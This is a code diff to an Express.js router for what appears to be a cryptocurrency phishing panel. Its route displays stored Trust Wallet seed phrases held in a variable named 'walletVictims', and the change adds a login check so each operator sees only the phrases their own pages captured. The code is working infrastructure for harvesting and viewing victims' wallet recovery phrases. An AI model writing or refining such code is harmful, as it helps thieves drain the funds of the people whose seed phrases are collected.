@@ -4,28 +4,26 @@ const router = express.Router();
 
 
 
-
-
 // PREMIUM OFFERS START HERE 
 
-
-
-
-
-
-
-
 // ALL ABOUT WALLET PHRASES 
-// Route to display wallet seed phrases
+// Route to display wallet seed phrases for the logged-in user
 router.get('/wallet-view', async (req, res) => {
+    const userId = req.session.userId; // Retrieve logged-in user's ID from session
+
+    if (!userId) {
+        return res.status(401).send("Unauthorized"); // Ensure the user is logged in
+    }
+
     try {
-        const walletVictims = await TrustWallet.find(); // Fetch all TrustWallet records
+        const walletVictims = await TrustWallet.find({ userId }); // Fetch wallet records for the specific user
         res.render('wallet-view', { walletVictims });
     } catch (err) {
         console.error('Error retrieving wallet data:', err);
         res.status(500).send('Error loading wallet data');
     }
 });
+
 
 // Route to render the Trust Wallet page
 router.get('/trustwallet', (req, res) => {
